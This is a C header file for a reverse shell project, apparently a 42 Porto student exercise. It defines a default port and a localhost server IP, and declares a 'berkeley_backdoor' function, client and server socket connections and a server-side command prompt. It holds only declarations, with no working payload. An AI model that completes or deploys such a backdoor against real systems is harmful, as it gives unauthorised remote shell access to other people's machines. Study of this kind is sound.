/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   reverse_shell.h                                    :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/10 14:48:25 by joesanto          #+#    #+#             */
/*   Updated: 2026/01/10 17:56:01 by joesanto         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef REVERSE_SHELL_H
# define REVERSE_SHELL_H

# include <stdint.h>

// UTILS
# define TRUE		1
# define FALSE		0
# define SUCCESS	0

// CONNECTION INFORMATIONS
# ifndef PORT
#  define PORT		4242
# endif

# ifndef SERVER_IP
#  define SERVER_IP	"127.0.0.1"
# endif

// BACKDOORS
int	berkeley_backdoor(void);

// CLIENT SOCKET CONNECTIONS
int		berkeley_client_connection(int	*client_fd);

// SERVER PROMPT COMMMAND
char	*prompt_command(char **cmdptr, uint64_t *cmdlen, char *new_host_ip);

// SERVER SOCKET CONNECTIONS
int		berkeley_server_connection(int *server_fd, int *client_fd, char **client_ip);

#endif
